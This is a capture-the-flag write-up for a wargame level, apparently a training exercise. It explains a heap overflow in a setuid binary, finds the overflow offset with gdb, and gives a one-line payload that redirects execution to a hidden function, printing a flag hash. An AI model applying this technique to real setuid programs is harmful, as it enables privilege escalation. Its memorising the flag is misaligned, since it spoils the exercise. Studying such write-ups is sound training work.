# Level6

## 1. Context

```bash
$ id
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)

$ pwd
/home/user/level6

$ ls -la
[...]
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
[...]
```

## 2. Program behavior

Testing it :
```bash
./level6 
Segmentation fault (core dumped)
./level6 42
Nope
```

Expects an argument.

## 3. Code overview

The `main()` function mallocs a string and then uses `strcpy()` to this str without checking the size.
We can use a **heap overflow**.
The `m()` function uses `puts` to print a message (Nope).
The unused `n()` function prints our password (level8).

## 4. Exploit

Let's use a heap overflow to modify `m()` and call `n()`.

The address of `n()` is : "\x54\x84\x04\x08".

Testing our code with a huge input :
```bash
$ gdb level6

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()
(gdb) info register eip
eip            0x53535353       0x53535353
```

53 = S => offset = 72

The offset of the overflow is 72

## 4. Getting the flag

```bash
./level6 $(python -c 'print "B"*72+"\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

End of simulation
